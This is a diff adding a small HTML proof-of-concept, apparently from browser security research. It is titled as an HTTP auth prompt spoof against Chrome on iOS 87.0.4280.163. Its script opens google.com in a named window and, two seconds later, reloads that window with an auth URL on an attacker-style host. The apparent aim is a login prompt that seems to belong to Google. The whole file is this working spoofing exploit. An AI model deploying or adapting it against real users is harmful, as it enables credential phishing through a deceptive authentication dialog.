@@ -1,0 +1,22 @@
+<html>
+                    <head>
+                      <title>HTTP Auth Prompt Spoof IOS chrome (87.0.4280.163) </title>
+                  </head>
+                    <body>
+                      <script>
+                        (() => {
+    const button = document.createElement('button');
+    button.innerText = 'Click Me';
+
+    button.addEventListener('click', async () => {
+      window.open('https://google.com', 'g');
+      setTimeout(() => {
+        window.open('https://eviltrap.site/trap/http-auth-prompt-spoof/auth', 'g');
+      }, 2000);
+    });
+
+    document.body.appendChild(button);
+  })()
+                      </script>
+                    </body>
+                  </html>
